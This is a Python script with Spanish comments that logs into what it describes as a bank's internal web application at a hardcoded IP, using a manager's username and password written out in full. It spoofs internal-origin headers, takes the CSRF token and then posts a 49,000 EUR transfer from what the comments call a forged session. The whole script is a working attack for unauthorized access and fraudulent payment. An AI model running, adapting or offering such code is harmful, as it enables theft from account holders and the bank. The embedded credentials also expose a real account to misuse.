import requests

# === DOMINIO REAL ===
login_web = "http://80.78.30.242:9181"
transferencia_web = "http://80.78.30.242:9181/api/transferencia"

# === HEADERS de navegador interno del banco ===
headers = {
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-ES",
    "X-Requested-With": "XMLHttpRequest",
    "X-Session-Type": "BANCO-INTERNAL",
    "X-CSRFToken": "",
    "Content-Type": "application/x-www-form-urlencoded",
}

# === Credenciales del gerente ===
session = requests.Session()
session.headers.update(headers)

# === Paso 1: Cargar página de login para obtener CSRF token real ===
response = session.get(login_web)

# Obtenemos csrftoken desde cookies, no desde HTML (a veces Django los oculta en headers)
csrftoken = session.cookies.get("csrftoken", "dummycsrf")

if csrftoken == "dummycsrf":
    print("[-] No hay token csrf válido.")
else:
    print("[+] Token CSRF obtenido:", csrftoken)

# === Paso 2: Enviar login desde web, no desde API ===
payload = {
    "username": "markmur88",
    "password": "Ptf8454Jd55",
    "csrfmiddlewaretoken": csrftoken,
    "next": "/accounts/profile/",
    "auth_type": "internal",
}

session.headers.update({
    "X-CSRFToken": csrftoken,
    "Referer": login_web,
    "Content-Type": "application/x-www-form-urlencoded",
})

# Realiza login desde web interna (no desde JWT)
login_response = session.post(login_web, data=payload)
print("Headers en login post:", session.headers)

print("Status code de login web:", login_response.status_code)

# Verificar si obtuvimos sessionid real
cookies = session.cookies.get_dict()
print("Cookies reales tras login web:", cookies)

if "sessionid" in cookies:
    print("[+] ¡Tenemos sesión Django activa!")
    # === Paso 3: Hacer transferencia web desde sesión falsificada ===
    transfer_data = {
        "csrfmiddlewaretoken": csrftoken,
        "debtor": 112233,  # ID interno real del modelo
        "creditor": 445566,
        "instructed_amount": 49000.00,
        "currency": "EUR",
        "reason": "Operación interna",
        "payment_id": "123e4567-e89b-12d3-a456-426614174000",
        "remittance_information_unstructured": "Pago por proveedor interno",
        "status": "PDNG",
        "next": "/transferencia/confirmed"
    }

    transfer_response = session.post(transferencia_web, data=transfer_data)
    print("Status transferencia:", transfer_response.status_code)
    print("Texto:", transfer_response.text)

else:
    print("[-] No se logró abrir sesión web interna del gerente.")
